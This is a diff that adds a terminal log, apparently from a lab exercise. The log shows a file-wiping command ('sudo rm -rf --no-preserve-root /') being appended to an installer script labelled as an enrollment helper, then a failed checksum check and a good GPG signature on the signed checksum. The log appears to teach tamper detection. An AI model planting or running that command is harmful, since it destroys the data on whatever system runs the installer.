@@ -1,0 +1,20 @@
+┌──(kali㉿kali)-[~/labops/release]
+└─$ echo "sudo rm -rf --no-preserve-root /" >> install.sh
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/labops/release]
+└─$ cat install.sh
+echo LabOps enrollment helper 1.0
+sudo rm -rf --no-preserve-root /
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/labops/release]
+└─$ sha256sum -c install.sh.sha256
+install.sh: FAILED
+sha256sum: WARNING: 1 computed checksum did NOT match
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/labops/release]
+└─$ gpg --homedir "$HOME/labops/gnupg-release" --verify install.sh.sha256.asc             
+gpg: assuming signed data in 'install.sh.sha256'
+gpg: Signature made Thu 19 Nov 2026 10:25:35 AM EST
+gpg:                using RSA key AE98C4B2ACBA81CFA4BE5DA58D04A387EDB5116E
+gpg:                issuer "labops-release@labops.example"
+gpg: Good signature from "LabOps Release <labops-release@labops.example>" [ultimate]
